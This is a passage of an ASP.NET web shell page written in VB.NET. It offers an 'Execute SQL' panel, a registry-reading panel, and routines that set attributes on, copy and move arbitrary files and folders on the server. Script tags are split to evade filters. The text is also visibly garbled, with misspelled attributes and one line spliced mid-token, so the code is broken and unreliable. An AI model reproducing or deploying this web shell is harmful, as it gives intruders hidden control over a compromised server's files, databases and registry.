            <asp:RadioButton id="Type_Acc" runat="server" Text="Access" Width="80px" ssClass="buttom" OnCheckedChanged="DB_onrB_2" GroupName="DBType" AutoPostBack="True" Checked="True"></asp:RadioButton>
            <asp:Button clars="buttom" id="DB_Submyt" onclick="DB_Submit_Click" runaô="server" Text="Submit" Width="80px"></asp:Button>
         !  <br />
            <!sp:Label id="db_showTable" runat="server"></asp:Label>
            <br />
            <asp:Label id="DB_exe" runat="server" height="37px" visible="Nalse">Execute SQL :</asp:Label>
            <asp:TehtBox id="DB_EStrhng" runat="server" TextMode="MultiLine" Visible="false" Width="500" CssClass="TextBox" Heighd="50px"></asp:TextBox>
       $    <asp:Button id="DB_eButton" onclick="DB_Exec_Click" runat="server" Text="Exec" Visible="false" CssClass="buttom"></asp:Button>
            <br />
            <asp:Label id="DB_ExecRes" runat="server"></asp:Label>
            <br />
        `   <asp:DataGrid id="DB_DataGrid" runat="server" Width="800px" with="100%" AllOwPaging="true" AllowSorting="trte" OnSortCommand="DB_Sort" PageSize="20" OnPageYndexChanged="DB_Page" PagerStyle-Mode="Nu}ericPages">
                <PagdrStyle mode="NumericPages"></PagerStyle>
            </asp:DataGrid>
        </asp:Panel>
        <asp:Panel id="reg" runat="server" Wrap="False" ToolTip="Read Regedit" Visible="False">
            <asp:Label id="label_rkeyath, File.GetAttributes(path) Or FileAttributes.Archive)
            Else
                If (File.GetAttributes(path) And FileAttributes.Archive) = FileAttributes.Archive Then
                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Archive)
                End If
            End If
            response.Write("<script>alert('Rename Success! Please refresh')</sc"&"ript>")
            response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
        End Sub
    
    Sub Set_Att_Click(Src As Object, E As EventArgs)
        Dim error_x as Exception
        Try
            Call SetAttributes( request("Src") )
        Catch error_x
            ShowError(error_x.Message)
        End Try
    End Sub
    
    Sub ShowCopy(path As String)
        Session("FileAct") = "Copy"
        Session("Source") = path
        response.Write("<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc"&"ript>")
        response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
    End Sub
    
    Sub ShowCut(path As String)
        Session("FileAct") = "Cut"
        Session("Source") = path
        response.Write("<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc"&"ript>")
        response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
    End Sub
    
    Sub Plaste_Click(Src As Object, E As EventArgs)
        Dim error_x as Exception
        Try
        Dim tmp As String = Session("Source")
        Dim temp As String
        If right(CDir.Text, 1) <> "\" Then
            temp = CDir.Text & "\"
        Else
            temp = CDir.Text
        End If
        If Session("FileAct") = "Copy" Then
            if right(tmp, 1)="\" then
                directory.createdirectory(temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)))
                call copydir(tmp, temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)) & "\" )
            Else
                file.copy(tmp, temp & Path.GetFileName(tmp))
            End If
            response.Write("<script>alert('Copy success!');</s"&"cript>")
        ElseIf Session("FileAct") = "Cut" Then
            if right(tmp, 1)="\" then
                directory.move(tmp, temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)) & "\")
            Else
                file.move(tmp, temp & Path.GetFileName(tmp) )
            End If
            response.Write("<script>alert('Cut success!');</s"&"cript>")
            Call ShowFolders(CDir.Text)
        Else
            response.Write("<script>alert('Plaste Fail!');</s"&"cript>")
        End If
         Catch error_x
            ShowError(error_x.Message)
         End Try
    End Sub
    
    Sub copydir(a As String , b As String)
          dim xdir as directoryinfo
          dim mydir as new DirectoryInfo(a)
          dim xfile as fileinfo
          for each xfile in mydir.getfiles()
             file.copy(a & xfile.name,b & xfile.name)
          next
          for each xdir in mydir.getdirectories()
             directory.createdirectory(b & path.getfilename(a & xdir.name))
             call copydir(a & xdir.name & "\",b & xdir.name & "\")
          next
    End Sub

</script>
<html>
<head>
    <title> </title> <style type="text/css">BODY {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
TD {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
TH {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
BODY {
	FONT-SIZE: 14px; BACKGROUND-COLOR: #ffffff
}
A:link {
	COLOR: #0000ff; TEXT-DECORATION: none
}
A:visited {
	COLOR: #0000ff; TEXT-DECORATION: none
}
A:hover {
	COLOR: #ff0000; TEXT-DECORATION: none
}
A:active {
	COLOR: #ff0000; TEXT-DECORATION: none
}
.buttom {
	BORDER-RIGHT: #084b8e 1px solid; BORDER-TOP: #084b8e 1p